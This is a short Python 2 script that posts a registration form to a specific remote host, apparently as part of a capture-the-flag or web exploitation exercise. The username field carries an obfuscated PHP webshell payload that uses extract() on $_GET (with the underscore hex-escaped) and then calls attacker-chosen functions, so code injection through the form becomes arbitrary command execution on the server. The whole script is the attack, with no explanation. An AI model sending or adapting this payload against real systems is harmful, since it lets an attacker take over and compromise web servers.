#!/usr/bin/python
# coding: utf-8

from requests import *

url = 'http://dm1536803965686.fun25.co.kr:23907/register.html'

data = {
        'username': '''<?@extract(${"\\x5fGET"});$a($b($c));?>''',
    'password': 'pass123'
}

print data['username']

r = post(url, data=data)
print r.text

